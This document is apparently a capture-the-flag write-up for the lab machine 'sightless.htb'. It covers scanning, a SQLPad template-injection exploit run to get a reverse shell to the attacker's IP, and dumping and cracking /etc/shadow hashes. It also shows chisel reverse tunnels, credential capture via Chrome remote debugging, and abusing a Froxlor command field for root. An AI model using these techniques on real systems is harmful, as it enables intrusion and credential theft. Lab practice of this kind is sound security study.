
# nmap 

```shell
Nmap scan report for 10.129.192.47
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.192.47]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/16%Time=66E836BA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A2,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.129\.192\.47\]\r\n500\x20Invalid\x20command:\x
SF:20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# added sightless.htb on /etc/hosts, also found a subdomain on the homepage sqlpad.sightless.htb

# site uses sqlpad v6.10.0 which has a [SSTI vulnerability](https://github.com/FlojBoj/CVE-2022-0944) 

```shell
python3 main.py http://sqlpad.sightless.htb 10.10.14.111 4444
```

# Got a root, but noticed its a docker container but still got credentials from /etc/shadow and /etc/passwd

```shell
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

# Cracked the hash using john the ripper

```
unshadow passwd.txt shadow.txt > unshadow.hash

john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.hash
```

> got the password michael:insaneclownposse

found using linpeas
```shell
john        1661  0.6  2.8 34019516 111848 ?     Sl   13:20   0:27              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.ALIOQ6 data:,

```
# Found a service named Froxlor, it only runs inside the machine so I used port forwarding to access it on my machine

```shell
ssh -L 8080:localhost:8080 michael@sightless.htb

```

# Chisel port forwarding works

```shell
# target machine
./chisel client --fingerprint 6C9KdBtVtNbX9Bt8/FH70P9E61/UV4qj1GdJ/Ce38aI= 10.10.14.111:8080 R:8081:localhost:8080

# attacker machine
./chisel server --socks5 --reverse
```

# Forwarded all ports running on the intranet for remote debugging

```shell
#server
chisel server --socks5 --reverse --port 8081
2024/09/17 10:13:47 server: Reverse tunnelling enabled
2024/09/17 10:13:47 server: Fingerprint 9cAOGM6y5LOa2mNXbfpxUty5fUq73KhZ84v/6XRUweM=
2024/09/17 10:13:47 server: Listening on http://0.0.0.0:8081
2024/09/17 10:14:14 server: session#5: tun: proxy#R:8080=>localhost:8080: Listening
^[[A2024/09/17 10:16:23 server: session#6: tun: proxy#R:8080=>localhost:8080: Listening
2024/09/17 10:16:23 server: session#6: tun: proxy#R:41267=>localhost:41267: Listening
2024/09/17 10:16:23 server: session#6: tun: proxy#R:40613=>localhost:40613: Listening
2024/09/17 10:16:23 server: session#6: tun: proxy#R:59369=>localhost:59369: Listening

#client
./chisel client --fingerprint 9cAOGM6y5LOa2mNXbfpxUty5fUq73KhZ84v/6XRUweM= 10.10.14.111:8081 R:8080:localhost:8080 R:41267:localhost:41267 R:40613:localhost:40613 R:59369:localhost:59369


```

# Then configured chromium, added all forwarded ports to capture remote debugging connection

> chrome://inspect -> configure  all forwarded ports-> wait for connection

password captured in network logs from index.php

admin:ForlorfroxAdmin

# Configured *PHP-FPM versions* , edited restart command input field to copy root.txt from /root to /tmp

